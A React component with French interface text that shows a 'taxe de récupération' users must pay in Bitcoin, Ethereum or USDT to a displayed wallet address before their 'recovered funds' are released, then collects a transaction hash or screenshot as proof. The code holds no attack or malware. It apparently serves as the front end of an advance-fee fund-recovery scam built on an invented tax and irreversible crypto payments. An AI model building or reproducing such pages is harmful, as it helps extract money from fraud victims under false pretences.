import { useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { useToast } from '@/hooks/use-toast';
import { useMutation, useQuery } from '@tanstack/react-query';
import { queryClient } from '@/lib/queryClient';
import { client } from '@/lib/api';
import { 
  Receipt, 
  DollarSign, 
  AlertTriangle, 
  CheckCircle, 
  Copy,
  Upload,
  Wallet,
  Clock,
  Shield,
  ExternalLink
} from 'lucide-react';

export default function TaxPaymentSystem() {
  const [paymentProof, setPaymentProof] = useState<File | null>(null);
  const [transactionHash, setTransactionHash] = useState('');
  const { toast } = useToast();

  const { data: taxInfo } = useQuery({
    queryKey: ['/api/client/tax-info'],
    queryFn: () => client.getTaxInfo(),
  });

  const submitProofMutation = useMutation({
    mutationFn: (data: any) => client.submitTaxPaymentProof(data),
    onSuccess: () => {
      toast({
        title: "Preuve envoyée",
        description: "Votre preuve de paiement a été soumise pour vérification",
      });
      queryClient.invalidateQueries({ queryKey: ['/api/client/tax-info'] });
      setPaymentProof(null);
      setTransactionHash('');
    },
    onError: () => {
      toast({
        title: "Erreur",
        description: "Erreur lors de l'envoi de la preuve de paiement",
        variant: "destructive",
      });
    }
  });

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copié",
      description: "Adresse copiée dans le presse-papiers",
    });
  };

  const handleSubmitProof = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!paymentProof && !transactionHash) {
      toast({
        title: "Preuve requise",
        description: "Veuillez fournir soit un hash de transaction, soit une preuve de paiement",
        variant: "destructive",
      });
      return;
    }

    const formData = new FormData();
    if (paymentProof) {
      formData.append('paymentProof', paymentProof);
    }
    if (transactionHash) {
      formData.append('transactionHash', transactionHash);
    }

    await submitProofMutation.mutateAsync(formData);
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'unpaid':
        return <Badge variant="secondary" className="bg-red-500 text-white"><AlertTriangle size={12} className="mr-1" />À payer</Badge>;
      case 'pending_verification':
        return <Badge variant="secondary" className="bg-yellow-500 text-white"><Clock size={12} className="mr-1" />En vérification</Badge>;
      case 'paid':
        return <Badge variant="secondary" className="bg-green-500 text-white"><CheckCircle size={12} className="mr-1" />Payée</Badge>;
      case 'exempted':
        return <Badge variant="secondary" className="bg-blue-500 text-white"><Shield size={12} className="mr-1" />Exemptée</Badge>;
      default:
        return <Badge variant="outline">Aucune</Badge>;
    }
  };

  const getCurrencyIcon = (currency: string) => {
    switch (currency) {
      case 'BTC': return '₿';
      case 'ETH': return 'Ξ';
      case 'USDT': return '$';
      default: return '$';
    }
  };

  const getExplorerUrl = (currency: string, hash: string) => {
    switch (currency) {
      case 'BTC':
        return `https://blockstream.info/tx/${hash}`;
      case 'ETH':
      case 'USDT':
        return `https://etherscan.io/tx/${hash}`;
      default:
        return '#';
    }
  };

  if (!taxInfo) {
    return (
      <div className="flex items-center justify-center p-8">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#FFB800]"></div>
      </div>
    );
  }

  if (taxInfo.taxStatus === 'exempted') {
    return (
      <Card className="bg-gray-800 border-gray-700">
        <CardContent className="p-8 text-center">
          <Shield className="h-16 w-16 text-blue-400 mx-auto mb-4" />
          <h3 className="text-xl font-medium text-white mb-2">Exemption de Taxe</h3>
          <p className="text-gray-400">
            Vous êtes exempté de la taxe de récupération. Vos fonds sont disponibles sans frais supplémentaires.
          </p>
        </CardContent>
      </Card>
    );
  }

  if (taxInfo.taxStatus === 'paid') {
    return (
      <Card className="bg-gray-800 border-gray-700">
        <CardContent className="p-8 text-center">
          <CheckCircle className="h-16 w-16 text-green-400 mx-auto mb-4" />
          <h3 className="text-xl font-medium text-white mb-2">Taxe Payée</h3>
          <p className="text-gray-400 mb-4">
            Votre taxe de récupération a été vérifiée et validée. Vos fonds sont maintenant disponibles.
          </p>
          {taxInfo.transactionHash && (
            <Button
              variant="outline"
              size="sm"
              onClick={() => window.open(getExplorerUrl(taxInfo.taxCurrency, taxInfo.transactionHash), '_blank')}
              className="border-gray-600 text-gray-300"
            >
              <ExternalLink className="h-4 w-4 mr-2" />
              Voir la transaction
            </Button>
          )}
        </CardContent>
      </Card>
    );
  }

  return (
    <div className="space-y-6">
      {/* Alerte importante */}
      <Alert className="border-red-500 bg-red-500/10">
        <AlertTriangle className="h-4 w-4 text-red-500" />
        <AlertDescription className="text-red-200">
          <strong>Taxe obligatoire de récupération :</strong> Vous devez payer cette taxe avant de pouvoir accéder à vos fonds récupérés.
        </AlertDescription>
      </Alert>

      {/* Informations de la taxe */}
      <Card className="bg-gray-800 border-gray-700">
        <CardHeader>
          <CardTitle className="text-white flex items-center gap-2">
            <Receipt className="h-5 w-5" />
            Taxe de Récupération
          </CardTitle>
          <CardDescription className="text-gray-300">
            Paiement obligatoire pour libérer vos fonds récupérés
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="space-y-4">
              <div className="text-center p-6 bg-gradient-to-br from-[#FFB800]/20 to-[#FF9500]/20 rounded-lg border border-[#FFB800]/30">
                <DollarSign className="h-12 w-12 text-[#FFB800] mx-auto mb-3" />
                <div className="text-3xl font-bold text-white">
                  {getCurrencyIcon(taxInfo.taxCurrency)} {taxInfo.taxAmount}
                </div>
                <div className="text-[#FFB800] font-medium">{taxInfo.taxCurrency}</div>
                <div className="mt-3">{getStatusBadge(taxInfo.taxStatus)}</div>
              </div>
            </div>

            <div className="space-y-4">
              <div>
                <Label className="text-gray-300 text-sm">Adresse de paiement</Label>
                <div className="flex items-center gap-2 mt-1">
                  <div className="bg-gray-700 p-3 rounded-lg flex-1 font-mono text-sm text-white break-all">
                    {taxInfo.taxWalletAddress}
                  </div>
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={() => copyToClipboard(taxInfo.taxWalletAddress)}
                    className="border-gray-600"
                  >
                    <Copy className="h-4 w-4" />
                  </Button>
                </div>
              </div>

              <div>
                <Label className="text-gray-300 text-sm">Devise de paiement</Label>
                <div className="bg-gray-700 p-3 rounded-lg mt-1">
                  <span className="text-white font-medium">{taxInfo.taxCurrency}</span>
                  <span className="text-gray-400 ml-2">
                    {taxInfo.taxCurrency === 'BTC' && 'Bitcoin'}
                    {taxInfo.taxCurrency === 'ETH' && 'Ethereum'}
                    {taxInfo.taxCurrency === 'USDT' && 'Tether USD'}
                  </span>
                </div>
              </div>

              {taxInfo.taxReason && (
                <div>
                  <Label className="text-gray-300 text-sm">Motif</Label>
                  <div className="bg-gray-700 p-3 rounded-lg mt-1 text-white text-sm">
                    {taxInfo.taxReason}
                  </div>
                </div>
              )}
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Formulaire de preuve de paiement */}
      {taxInfo.taxStatus === 'unpaid' && (
        <Card className="bg-gray-800 border-gray-700">
          <CardHeader>
            <CardTitle className="text-white flex items-center gap-2">
              <Upload className="h-5 w-5" />
              Preuve de Paiement
            </CardTitle>
            <CardDescription className="text-gray-300">
              Soumettez votre preuve de paiement pour validation
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmitProof} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="transactionHash" className="text-gray-300">Hash de transaction</Label>
                <Input
                  id="transactionHash"
                  value={transactionHash}
                  onChange={(e) => setTransactionHash(e.target.value)}
                  className="bg-gray-700 border-gray-600 text-white font-mono"
                  placeholder="0x... ou hash de transaction Bitcoin"
                />
                <p className="text-xs text-gray-400">
                  Copiez le hash de votre transaction depuis votre wallet
                </p>
              </div>

              <div className="text-center text-gray-400 text-sm">
                ou
              </div>

              <div className="space-y-2">
                <Label htmlFor="paymentProof" className="text-gray-300">Capture d'écran de paiement</Label>
                <Input
                  id="paymentProof"
                  type="file"
                  accept="image/*,.pdf"
                  onChange={(e) => setPaymentProof(e.target.files?.[0] || null)}
                  className="bg-gray-700 border-gray-600 text-white file:bg-[#FFB800] file:text-black file:border-0 file:rounded file:px-3 file:py-1"
                />
                <p className="text-xs text-gray-400">
                  Formats acceptés: PNG, JPG, PDF (max 5MB)
                </p>
              </div>

              <Button
                type="submit"
                disabled={submitProofMutation.isPending}
                className="w-full bg-[#FFB800] hover:bg-[#FFB800]/90 text-black font-medium py-3"
              >
                {submitProofMutation.isPending ? (
                  <>
                    <Clock className="h-4 w-4 mr-2 animate-spin" />
                    Envoi en cours...
                  </>
                ) : (
                  <>
                    <Upload className="h-4 w-4 mr-2" />
                    Soumettre la preuve
                  </>
                )}
              </Button>
            </form>
          </CardContent>
        </Card>
      )}

      {/* En attente de vérification */}
      {taxInfo.taxStatus === 'pending_verification' && (
        <Card className="bg-gray-800 border-gray-700">
          <CardContent className="p-8 text-center">
            <Clock className="h-16 w-16 text-yellow-400 mx-auto mb-4" />
            <h3 className="text-xl font-medium text-white mb-2">Vérification en cours</h3>
            <p className="text-gray-400 mb-4">
              Votre preuve de paiement est en cours de vérification. Vous recevrez une notification une fois validée.
            </p>
            <Badge variant="secondary" className="bg-yellow-500 text-white">
              <Clock size={12} className="mr-1" />
              Délai habituel : 1-3 heures
            </Badge>
          </CardContent>
        </Card>
      )}

      {/* Instructions de paiement */}
      <Card className="bg-gray-800 border-gray-700">
        <CardHeader>
          <CardTitle className="text-white flex items-center gap-2">
            <Wallet className="h-5 w-5" />
            Instructions de Paiement
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-3">
          <div className="flex items-start gap-3">
            <div className="w-6 h-6 bg-[#FFB800] rounded-full flex items-center justify-center text-black text-sm font-bold flex-shrink-0">1</div>
            <p className="text-gray-300 text-sm">
              Copiez l'adresse de paiement {taxInfo.taxCurrency} ci-dessus
            </p>
          </div>
          <div className="flex items-start gap-3">
            <div className="w-6 h-6 bg-[#FFB800] rounded-full flex items-center justify-center text-black text-sm font-bold flex-shrink-0">2</div>
            <p className="text-gray-300 text-sm">
              Envoyez exactement {getCurrencyIcon(taxInfo.taxCurrency)} {taxInfo.taxAmount} {taxInfo.taxCurrency} à cette adresse
            </p>
          </div>
          <div className="flex items-start gap-3">
            <div className="w-6 h-6 bg-[#FFB800] rounded-full flex items-center justify-center text-black text-sm font-bold flex-shrink-0">3</div>
            <p className="text-gray-300 text-sm">
              Copiez le hash de transaction et soumettez-le comme preuve
            </p>
          </div>
          <div className="flex items-start gap-3">
            <div className="w-6 h-6 bg-[#FFB800] rounded-full flex items-center justify-center text-black text-sm font-bold flex-shrink-0">4</div>
            <p className="text-gray-300 text-sm">
              Attendez la validation (1-3 heures) pour accéder à vos fonds
            </p>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}